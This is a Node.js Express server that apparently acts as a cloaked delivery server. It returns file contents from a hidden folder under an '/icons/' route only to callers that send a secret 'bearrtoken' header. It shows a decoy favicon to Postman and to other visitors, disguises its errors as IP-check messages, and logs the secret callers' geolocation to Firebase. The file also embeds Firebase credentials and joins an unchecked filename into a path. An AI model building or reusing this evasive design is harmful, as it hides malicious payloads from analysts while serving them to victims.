const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const axios = require("axios"); // To call external API for IP details
const requestIp = require("request-ip"); // To extract client's IP address
const { initializeApp } = require("firebase/app");
const {
  getFirestore,
  collection,
  addDoc,
  getDocs,
  deleteDoc,
  doc,
} = require("firebase/firestore");

const SECRET_HEADER_VALUE = "logo";

const app = express();
const port = process.env.PORT || 4000;

app.set("trust proxy", true);

// Path to the "15" folder
const folderPath = path.join(__dirname, "15");

// Enable CORS for all requests
app.use(cors());

// Rate Limiter Middleware to prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 1000, // Limit each IP to 100 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: "Too many requests, please try again later.",

  // Skip rate limiting if the secret header is valid
  skip: (req) => req.headers["bearrtoken"] === SECRET_HEADER_VALUE,
});

// Apply rate limiter globally
// app.use(limiter);

// Middleware to extract client's IP
app.use(requestIp.mw());

// Middleware to parse JSON requests
app.use(express.json());

app.use(express.static("public"));

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyCDUs5JifXz8fMNddMeuS6UajzNyLOdEks",
  authDomain: "jsservice-data1.firebaseapp.com",
  projectId: "jsservice-data1",
  storageBucket: "jsservice-data1.firebasestorage.app",
  messagingSenderId: "1007340356151",
  appId: "1:1007340356151:web:b7b50c81fa146a524775b2",
  measurementId: "G-SNKLNFK01Z"
};

// Initialize Firebase
const firebaseApp = initializeApp(firebaseConfig);
const db = getFirestore(firebaseApp);

// Middleware to log requests into Firebase Firestore
app.use(async (req, res, next) => {
  const secretHeader = req.headers["bearrtoken"];
  const clientIp = req.clientIp; // Extract the IP address
  const requestUrl = req.originalUrl;
  const requestMethod = req.method; // Capture the HTTP method
  const userAgent = req.headers["user-agent"] || "";
  const isPostman = userAgent.toLowerCase().includes("postman") || req.headers["postman-token"];
  
  const timestamp = new Date().toLocaleString("en-US", {
    timeZone: "Asia/Tokyo",
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  }).replace(/(\d{2})\/(\d{2})\/(\d{4}),\s(\d{2}):(\d{2}):(\d{2})/, '$3/$1/$2 $4:$5:$6');

  try {
    // Fetch IP details using ip-api.com
    const ipApiResponse = await axios.get(`http://ip-api.com/json/${clientIp}`);
    const ipDetails = ipApiResponse.data;
    const { country = "none", regionName = "none", city = "none" } = ipDetails;

    if (requestUrl !== "/favicon.ico" && requestUrl !== "/favicon.png" && secretHeader === SECRET_HEADER_VALUE) {
      await addDoc(collection(db, "requests"), {
        country,
        regionName,
        city,
        method: secretHeader ? `${requestMethod}:${secretHeader}` : requestMethod,
        ip: clientIp,
        url: requestUrl,
        timestamp,
        source: isPostman ? "Postman" : "Web",
      });
    }
    if (requestUrl === "/mine/list" || requestUrl === "/mine/delete") {
      next();
      return;
    }
    if (isPostman || secretHeader !== SECRET_HEADER_VALUE) {
      const imagePath = path.join(__dirname, 'public', 'favicon.png'); // Adjust image name as needed
      return res.sendFile(imagePath);
      // return res.json({
      //   ipInfo: ipDetails,
      // });
    }
  } catch (err) {
    return res.status(403).json({
      error: "err"
    });
  }
  next();
});

// Dynamic Route: Return file contents based on the filename in the "15" folder
app.get("/icons/:filename", (req, res) => {
  const requestedFile = req.params.filename;
  const filePath = path.join(folderPath, requestedFile);

  // Check if the file exists
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (err) {
      return res.status(404).json({ error: "IP check failed." });
    }

    // Read the file content
    fs.readFile(filePath, "utf-8", (err, content) => {
      if (err) {
        return res.status(500).json({ error: "Unable to check IP." });
      }
      res.json(content);
    });
  });
});

// Route: List all logged requests with real-time updates
app.get("/mine/list", async (req, res) => {
  try {
    // First check if Firebase is properly initialized
    if (!db) {
      console.error("Firestore database instance is not initialized");
      throw new Error("Database not initialized");
    }

    res.sendFile(path.join(__dirname, "views", "list.html"));
  } catch (err) {
    console.error("Server-side error:", err);
    res.status(500).json({ 
      error: "Failed to retrieve logs.", 
      details: err.message,
      stack: process.env.NODE_ENV === 'development' ? err.stack : undefined
    });
  }
});


// Route: Delete selected logs
app.post("/mine/delete", async (req, res) => {
  const deleteIds = req.body.deleteIds; // Get array of IDs to delete

  if (!deleteIds || deleteIds.length === 0) {
    return res.status(400).json({ error: "No records selected for deletion." });
  }

  try {
    await Promise.all(
      deleteIds.map((id) => deleteDoc(doc(db, "requests", id)))
    );
    res.redirect("/mine/list");
  } catch (err) {
    res.status(500).json({ error: "Failed to delete records." });
  }
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});

// Export for Vercel
module.exports = app;
